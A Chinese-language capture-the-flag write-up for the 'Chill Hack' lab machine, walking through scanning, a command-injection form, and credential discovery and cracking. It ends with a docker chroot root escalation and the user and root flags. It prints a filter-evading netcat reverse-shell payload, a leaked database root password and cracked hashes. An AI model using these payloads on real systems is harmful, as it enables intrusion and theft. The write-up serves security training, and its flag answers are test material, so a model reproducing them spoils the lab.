# Chill Hack

nmap快速扫描：
```
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
80/tcp    open     http
622/tcp   filtered collaborator
```

nmap版本扫描：
```
PORT    STATE  SERVICE      VERSION
21/tcp  open   ftp          vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.72.135
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp  open   ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp  open   http         Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
622/tcp closed collaborator
```

gobuster扫描：
```
/images               (Status: 301) [Size: 315] [--> http://10.10.160.216/images/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.160.216/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.160.216/js/]
/fonts                (Status: 301) [Size: 314] [--> http://10.10.160.216/fonts/]
/secret               (Status: 301) [Size: 315] [--> http://10.10.160.216/secret/]
```
看到这个/secret，不用多说，八成就是这个，进去后发现一个可以执行系统命令的框，很明显了，命令注入。

这个地方应该可以使用commix，但我不会用。
```
commix --url="http://10.10.160.216/secret/#" --data="command=INJECT_HERE"

使用--reverse_tcp开启反向shell，
```

手动注入，看的wp，这个地方可以用反斜线绕过过滤：
```
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
```


/var/www/files文件下的index.php的文件截取，发现了凭据。
```
if(isset($_POST['submit']))
	{
		$username = $_POST['username'];
		$password = $_POST['password'];
		ob_start();
		session_start();
		try
		{
			$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
			$con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
		}
		catch(PDOException $e)
		{
			exit("Connection failed ". $e->getMessage());
		}
		require_once("account.php");
		$account = new Account($con);
		$success = $account->login($username,$password);
		if($success)
		{
			header("Location: hacker.php");
		}
	}
mysql:dbname=webportal
host:localhost
username:root
password:!@m+her00+@db
```

登录数据库：
``````
mysql -u root -p
``````

数据据库名是webportal，里面有个表users，直接输出表的内容：
```
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
```
MD，试了，没用，登不上。
```
anurodh:7e53614ced3640d5de23f111806cc4fd:masterpassword
apaar:686216240e5af30df0501e53c789a649:dontaskdonttell
```
这个地方是兔子洞。

在www-data的权限下使用```sudo -l```发现可以不使用密码执行/home/apaar/.helpline.sh，输入/bin/bash可以以使用apaar权限的shell(wp上看来的)  
```sudo -u apaar /home/apaar/.helpline.sh```  
但是不能用在其他用户上(不然直接使用root)，到此，你可以读到local.txt的一个flag。

**下面这一步可有可无：**

拿到apaar的shell之后，可以通过更改ssh公钥的方式登录进入apaar:
```
ssh-keygen -d apaar
```
密码随便设一个，使用vim更改.ssh下的公钥文件(就那一个文件，忘记名字了)，把刚刚生成的.pub文件的内容替换进去，然后用生成的私钥登录。

回到/var/www/files文件下，聪明的你一定发现了hacker.php，也一定发现了代码里的文件:
```
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
	color:red;
	font-weight: bold;
}
h1
{
	color: yellow;
	font-weight: bold;
}
</style>
<center>
	<img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
	<h1 style="background-color:red;">You have reached this far. </h2>
	<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
```
然后这个图片是有问题的，就是隐写术，可以用steghide检测一下，发现里面有一个zip：
```
steghide --extract -sf hacker-with-laptop_23-2147985341.jpg
```
解压zip的时候发现有密码，ok，熟悉的流程：
```
zip2john backup.zip > hash1.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
密码是:
pass1word        (backup.zip/source_code.php) 
```
解压后发先一个php文件，打开后发现：
```
<?php
        if(isset($_POST['submit']))
	{
		$email = $_POST["email"];
		$password = $_POST["password"];
		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
		{ 
			$random = rand(1000,9999);?><br><br><br>
			<form method="POST">
				Enter the OTP: <input type="number" name="otp">
				<input type="submit" name="submitOtp" value="Submit">
			</form>
		<?php	mail($email,"OTP for authentication",$random);
			if(isset($_POST["submitOtp"]))
				{
					$otp = $_POST["otp"];
					if($otp == $random)
					{
						echo "Welcome Anurodh!";
						header("Location: authenticated.php");
					}
					else
					{
						echo "Invalid OTP";
					}
				}
 		}
		else
		{
			echo "Invalid Username or Password";
		}
        }
?>
```
发现password疑似base64：
```
echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
解出来是：
!d0ntKn0wmYp@ssw0rd
```
这个才是用户anurodh的凭据，使用ssh登录。

输入id，你会发现你拥有docker的权限，所以在GTFObins上查找docker，可以直接提权:
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
拿到root权限




### user flag
答案：{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}

### root flag
答案：{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}